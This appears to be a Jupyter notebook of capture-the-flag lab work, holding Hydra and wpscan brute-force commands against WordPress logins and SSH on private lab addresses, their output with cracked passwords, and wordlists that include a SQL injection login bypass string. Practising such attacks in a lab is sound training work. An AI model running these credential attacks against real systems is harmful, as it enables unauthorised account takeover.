{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "1be5ed90-b114-4a39-9dfa-1a85734b999f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TARGET=10.10.174.58\n"
     ]
    }
   ],
   "source": [
    "%env TARGET=10.10.174.58"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "5dd253ad-85ee-43d6-a1c3-70d5bca4f6c8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: PL=SecLists/Passwords/probable-v2-top1575.txt\n",
      "env: PLRY=/usr/share/wordlists/rockyou.txt\n",
      "env: UL=SecLists/Usernames/Names/names.txt\n",
      "env: UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt\n",
      "env: USER=user\n"
     ]
    }
   ],
   "source": [
    "# %env PL=/usr/share/wordlists/SecLists/Passwords/probable-v2-top207.txt\n",
    "%env PL=SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt\n",
    "\n",
    "%env UL=SecLists/Usernames/Names/names.txt\n",
    "%env UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt\n",
    "\n",
    "%env USER=user"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "84169507-1a20-48af-ad31-298ef92206e1",
   "metadata": {
    "tags": []
   },
   "source": [
    "# Wordpress:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "7e6e1593-d90f-41a4-b6e6-7a1f8ecd2af2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: DIR=/wp-login.php\n",
      "env: BODY=log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.246.16%2Fwp-admin%2F&testcookie=1\n",
      "env: COOKIE=H=Cookie: wordpress_test_cookie=WP+Cookie+check\n",
      "env: COND=The password\n"
     ]
    }
   ],
   "source": [
    "%env DIR=/wp-login.php\n",
    "%env BODY=log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.246.16%2Fwp-admin%2F&testcookie=1\n",
    "%env COOKIE=H=Cookie: wordpress_test_cookie=WP+Cookie+check\n",
    "%env COND=The password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a1bf1bf7-e934-4003-a604-2629d6b25dd4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: URL=10.10.57.244\n"
     ]
    }
   ],
   "source": [
    "%env URL=10.10.57.244"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "440cb243-cd08-47b9-948e-35f1f3950b26",
   "metadata": {},
   "outputs": [],
   "source": [
    "# !echo hydra -I -t 64 -I -l Elliot -P fsociety.txt $URL http-post-form  \\\"$DIR:$BODY:$COND\\\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "73328f38-ac5e-4ab4-b00f-c6be04715950",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-07 06:15:37\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 826234 login tries (l:1/p:826234), ~51640 tries per task\n",
      "[DATA] attacking http-post-form://10.10.57.244:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.246.16%2Fwp-admin%2F&testcookie=1:The password\n",
      "[STATUS] 2013.00 tries/min, 2013 tries in 00:01h, 824221 to do in 06:50h, 16 active\n",
      "[STATUS] 2008.67 tries/min, 6026 tries in 00:03h, 820208 to do in 06:49h, 16 active\n",
      "[STATUS] 1049.57 tries/min, 7347 tries in 00:07h, 818887 to do in 13:01h, 16 active\n",
      "[STATUS] 584.87 tries/min, 8773 tries in 00:15h, 817461 to do in 23:18h, 16 active\n",
      "[STATUS] 375.87 tries/min, 11652 tries in 00:31h, 814582 to do in 36:08h, 16 active\n",
      "^C\n",
      "The session file ./hydra.restore was written. Type \"hydra -R\" to resume session.\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -t 16 -I -l elliot -P fshort.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c55bbbcc-423a-43f6-9145-6f163c3dd176",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "_______________________________________________________________\n",
      "         __          _______   _____\n",
      "         \\ \\        / /  __ \\ / ____|\n",
      "          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n",
      "           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n",
      "            \\  /\\  /  | |     ____) | (__| (_| | | | |\n",
      "             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n",
      "\n",
      "         WordPress Security Scanner by the WPScan Team\n",
      "                         Version 3.8.18\n",
      "       Sponsored by Automattic - https://automattic.com/\n",
      "       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n",
      "_______________________________________________________________\n",
      "\n",
      "\u001b[32m[+]\u001b[0m URL: http://10.10.254.37/ [10.10.254.37]\n",
      "\u001b[32m[+]\u001b[0m Started: Thu Oct  7 06:57:42 2021\n",
      "\n",
      "Interesting Finding(s):\n",
      "\n",
      "\u001b[32m[+]\u001b[0m Headers\n",
      " | Interesting Entries:\n",
      " |  - Server: Apache\n",
      " |  - X-Mod-Pagespeed: 1.9.32.3-4523\n",
      " | Found By: Headers (Passive Detection)\n",
      " | Confidence: 100%\n",
      "\n",
      "\u001b[32m[+]\u001b[0m robots.txt found: http://10.10.254.37/robots.txt\n",
      " | Found By: Robots Txt (Aggressive Detection)\n",
      " | Confidence: 100%\n",
      "\n",
      "\u001b[32m[+]\u001b[0m XML-RPC seems to be enabled: http://10.10.254.37/xmlrpc.php\n",
      " | Found By: Direct Access (Aggressive Detection)\n",
      " | Confidence: 100%\n",
      " | References:\n",
      " |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n",
      " |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n",
      " |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n",
      " |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n",
      " |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n",
      "\n",
      "\u001b[32m[+]\u001b[0m The external WP-Cron seems to be enabled: http://10.10.254.37/wp-cron.php\n",
      " | Found By: Direct Access (Aggressive Detection)\n",
      " | Confidence: 60%\n",
      " | References:\n",
      " |  - https://www.iplocation.net/defend-wordpress-from-ddos\n",
      " |  - https://github.com/wpscanteam/wpscan/issues/1299\n",
      "\n",
      "\u001b[32m[+]\u001b[0m WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).\n",
      " | Found By: Emoji Settings (Passive Detection)\n",
      " |  - http://10.10.254.37/079937a.html, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.3.1'\n",
      " | Confirmed By: Meta Generator (Passive Detection)\n",
      " |  - http://10.10.254.37/079937a.html, Match: 'WordPress 4.3.1'\n",
      "\n",
      "\u001b[32m[+]\u001b[0m WordPress theme in use: twentyfifteen\n",
      " | Location: http://10.10.254.37/wp-content/themes/twentyfifteen/\n",
      " | Last Updated: 2021-07-22T00:00:00.000Z\n",
      " | Readme: http://10.10.254.37/wp-content/themes/twentyfifteen/readme.txt\n",
      " | \u001b[33m[!]\u001b[0m The version is out of date, the latest version is 3.0\n",
      " | Style URL: http://10.10.254.37/wp-content/themes/twentyfifteen/style.css?ver=4.3.1\n",
      " | Style Name: Twenty Fifteen\n",
      " | Style URI: https://wordpress.org/themes/twentyfifteen/\n",
      " | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...\n",
      " | Author: the WordPress team\n",
      " | Author URI: https://wordpress.org/\n",
      " |\n",
      " | Found By: Css Style In 404 Page (Passive Detection)\n",
      " |\n",
      " | Version: 1.3 (80% confidence)\n",
      " | Found By: Style (Passive Detection)\n",
      " |  - http://10.10.254.37/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'\n",
      "\n",
      "\u001b[32m[+]\u001b[0m Enumerating All Plugins (via Passive Methods)\n",
      "\n",
      "\u001b[34m[i]\u001b[0m No plugins Found.\n",
      "\n",
      "\u001b[32m[+]\u001b[0m Enumerating Config Backups (via Passive and Aggressive Methods)\n",
      " Checking Config Backups - Time: 00:00:33 <=> (137 / 137) 100.00% Time: 00:00:33\n",
      "\n",
      "\u001b[34m[i]\u001b[0m No Config Backups Found.\n",
      "\n",
      "\u001b[32m[+]\u001b[0m Performing password attack on Xmlrpc Multicall against 1 user/s\n",
      "Progress Time: 00:20:56 <                    > (75 / 1652)  4.53%  ETA: 07:20:57\r"
     ]
    }
   ],
   "source": [
    "!wpscan --url http://10.10.254.37/ --passwords fsociety.txt --usernames elliot"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "3dda37e5-d3d9-41ef-9e18-e94c021c987f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-06 23:59:06\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:20/p:1), ~2 tries per task\n",
      "[DATA] attacking http-post-form://10.10.113.97:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.167.66%2Fwp-admin%2F&testcookie=1:Invalid username.\n",
      "[\u001b[1;32m80\u001b[0m][\u001b[1;32mhttp-post-form\u001b[0m] host: \u001b[1;32m10.10.113.97\u001b[0m   login: \u001b[1;32mElliot\u001b[0m   password: \u001b[1;32mpassword\u001b[0m\n",
      "1 of 1 target successfully completed, 1 valid password found\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-06 23:59:12\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L fsociety.txt -p password $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "7cbf95ac-a446-41a8-aff9-08a756829939",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hydra -I -l user -P fsociety.txt 10.10.113.97 http-post-form \"/wp-login.php:log=log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.167.66%2Fwp-admin%2F&testcookie=1:Unknown username\"\n"
     ]
    }
   ],
   "source": [
    "!echo hydra -I -l Elliot -P fsociety.txt $URL http-post-form  \\\"$DIR:$BODY:$COND\\\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "a56b7efc-e7e0-464f-b72c-5a2aac865664",
   "metadata": {},
   "outputs": [
    {
     "ename": "UnboundLocalError",
     "evalue": "local variable 'child' referenced before assignment",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m/miniconda/lib/python3.9/site-packages/IPython/utils/_process_posix.py\u001b[0m in \u001b[0;36msystem\u001b[0;34m(self, cmd)\u001b[0m\n\u001b[1;32m    156\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 157\u001b[0;31m                 \u001b[0mchild\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpexpect\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mspawn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msh\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'-c'\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcmd\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m  \u001b[0;31m# Vanilla Pexpect\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    158\u001b[0m             \u001b[0mflush\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstdout\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/miniconda/lib/python3.9/site-packages/pexpect/pty_spawn.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, command, args, timeout, maxread, searchwindowsize, logfile, cwd, env, ignore_sighup, echo, preexec_fn, encoding, codec_errors, dimensions, use_poll)\u001b[0m\n\u001b[1;32m    204\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 205\u001b[0;31m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_spawn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcommand\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mpreexec_fn\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdimensions\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    206\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0muse_poll\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0muse_poll\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/miniconda/lib/python3.9/site-packages/pexpect/pty_spawn.py\u001b[0m in \u001b[0;36m_spawn\u001b[0;34m(self, command, args, preexec_fn, dimensions)\u001b[0m\n\u001b[1;32m    302\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 303\u001b[0;31m         self.ptyproc = self._spawnpty(self.args, env=self.env,\n\u001b[0m\u001b[1;32m    304\u001b[0m                                      cwd=self.cwd, **kwargs)\n",
      "\u001b[0;32m/miniconda/lib/python3.9/site-packages/pexpect/pty_spawn.py\u001b[0m in \u001b[0;36m_spawnpty\u001b[0;34m(self, args, **kwargs)\u001b[0m\n\u001b[1;32m    314\u001b[0m         \u001b[0;34m'''Spawn a pty and return an instance of PtyProcess.'''\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 315\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mptyprocess\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mPtyProcess\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mspawn\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    316\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/miniconda/lib/python3.9/site-packages/ptyprocess/ptyprocess.py\u001b[0m in \u001b[0;36mspawn\u001b[0;34m(cls, argv, cwd, env, echo, preexec_fn, dimensions, pass_fds)\u001b[0m\n\u001b[1;32m    314\u001b[0m         \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mexec_err_pipe_write\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 315\u001b[0;31m         \u001b[0mexec_err_data\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mexec_err_pipe_read\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m4096\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    316\u001b[0m         \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mexec_err_pipe_read\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: ",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mUnboundLocalError\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_63828/1737436076.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msystem\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'hydra -I -l root -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\"'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m/miniconda/lib/python3.9/site-packages/ipykernel/zmqshell.py\u001b[0m in \u001b[0;36msystem_piped\u001b[0;34m(self, cmd)\u001b[0m\n\u001b[1;32m    634\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0muser_ns\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'_exit_code'\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msystem\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcmd\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    635\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 636\u001b[0;31m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0muser_ns\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'_exit_code'\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msystem\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvar_expand\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcmd\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdepth\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    637\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    638\u001b[0m     \u001b[0;31m# Ensure new system_piped implementation is used\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/miniconda/lib/python3.9/site-packages/IPython/utils/_process_posix.py\u001b[0m in \u001b[0;36msystem\u001b[0;34m(self, cmd)\u001b[0m\n\u001b[1;32m    171\u001b[0m             \u001b[0;31m# (the character is known as ETX for 'End of Text', see\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    172\u001b[0m             \u001b[0;31m# curses.ascii.ETX).\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 173\u001b[0;31m             \u001b[0mchild\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msendline\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mchr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m3\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    174\u001b[0m             \u001b[0;31m# Read and print any more output the program might produce on its\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    175\u001b[0m             \u001b[0;31m# way out.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mUnboundLocalError\u001b[0m: local variable 'child' referenced before assignment"
     ]
    }
   ],
   "source": [
    "!hydra -I -l root -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b63ad53c-2189-491a-bb11-720277d32c20",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l \"mr. robot\" -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ab6bed5-4b11-4988-853d-fd9162c21b2d",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l elliot -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "16f6456a-3399-41dd-b626-b4d4c326c6f7",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL_S -P fsociety.txt $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a625eac1-4249-479f-bcca-33b12679e928",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -l user -P $PL $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f03910d0-fd70-4083-8113-9a93943df72c",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL -p password $URL http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3f301df4-3ef7-4ed0-a449-8d337cb19838",
   "metadata": {
    "tags": []
   },
   "source": [
    "# SSH:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "cb1ac30a-13f5-4152-8d92-a3a9263513f8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 17:45:56\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task\n",
      "[DATA] attacking ssh://10.10.174.58:22/\n",
      "[\u001b[1;32m22\u001b[0m][\u001b[1;32mssh\u001b[0m] host: \u001b[1;32m10.10.174.58\u001b[0m   login: \u001b[1;32mlin\u001b[0m   password: \u001b[1;32mRedDr4gonSynd1cat3\u001b[0m\n",
      "1 of 1 target successfully completed, 1 valid password found\n",
      "[WARNING] Writing restore file because 8 final worker threads did not complete until end.\n",
      "[ERROR] 8 targets did not resolve or could not be connected\n",
      "[ERROR] 0 target did not complete\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-13 17:46:02\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -l lin -P locks.txt $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "3e7b4eb6-d9f8-4c25-8adf-e2e84bb86d83",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 17:33:33\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 1575 login tries (l:1/p:1575), ~99 tries per task\n",
      "[DATA] attacking ssh://10.10.155.48:2222/\n",
      "[STATUS] 182.00 tries/min, 182 tries in 00:01h, 1399 to do in 00:08h, 16 active\n",
      "[STATUS] 125.00 tries/min, 375 tries in 00:03h, 1206 to do in 00:10h, 16 active\n",
      "[STATUS] 117.57 tries/min, 823 tries in 00:07h, 759 to do in 00:07h, 16 active\n",
      "[STATUS] 115.25 tries/min, 1383 tries in 00:12h, 199 to do in 00:02h, 16 active\n",
      "^C\n",
      "The session file ./hydra.restore was written. Type \"hydra -R\" to resume session.\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -l root -P $PL -s 2222 $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf9b6b59-47f6-41c1-952c-cfac1f946cc9",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "!hydra -I -l $USER -P $PL $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6881571d-6dd1-40e7-b536-8d2effaa16ce",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL_S -P $PL $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0dd147e4-7357-434c-b376-66609cef02ff",
   "metadata": {},
   "outputs": [],
   "source": [
    "!hydra -I -L $UL -P $PL $TARGET ssh"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1e1d03f1-c2ae-492c-8549-1208fcff69d3",
   "metadata": {
    "tags": []
   },
   "source": [
    "# HTTP POST:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b7b8a41-d6e7-4cf4-b57c-07e1457569ed",
   "metadata": {},
   "outputs": [],
   "source": [
    "# %env PL=/usr/share/wordlists/SecLists/Passwords/probable-v2-top207.txt\n",
    "%env PL=SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt\n",
    "\n",
    "%env UL=SecLists/Usernames/Names/names.txt\n",
    "%env UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7484d520-2594-4ee1-9672-d5d6c22ab89f",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile my_usernames.txt\n",
    "\n",
    "admin\n",
    "administrator\n",
    "root\n",
    "' OR 1 -- -\n",
    "\n",
    "# special:\n",
    "# service name\n",
    "# look for defaults online\n",
    "\n",
    "# others:\n",
    "    \n",
    "aubreanna\n",
    "jenkins"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ff614fe8-37a3-48ca-89e0-2e79f760d8b5",
   "metadata": {},
   "source": [
    "Machine name, challenge name, target name, website name, admin:admin, admin:password, admin:123456\n",
    "\n",
    "Vary caps: password, PASSWORD, Password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f2a645fe-1c0b-4c99-b2c1-6465211c2fec",
   "metadata": {},
   "outputs": [],
   "source": [
    "%%writefile my_passwords.txt\n",
    "\n",
    "admin\n",
    "root\n",
    "password\n",
    "password123\n",
    "password321\n",
    "123456\n",
    "' OR 1 -- -\n",
    "\n",
    "# special:\n",
    "# username\n",
    "# service name\n",
    "# none\n",
    "\n",
    "\n",
    "# defaults:\n",
    "\n",
    "# others:\n",
    "\n",
    "internal\n",
    "aubreanna\n",
    "bubb13guM!@#123\n",
    "my2boys\n",
    "jenkins\n",
    "wordpress123\n",
    "jenkins123"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "89b4fee9-fb16-4809-8d5f-b44674f42039",
   "metadata": {
    "jp-MarkdownHeadingCollapsed": true,
    "tags": []
   },
   "source": [
    "## Jenkins:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9119a8f6-c2c4-4d7b-907f-df07eb26ed30",
   "metadata": {},
   "outputs": [],
   "source": [
    "%env TARGET=127.0.0.1\n",
    "%env PORT=444"
   ]
  },
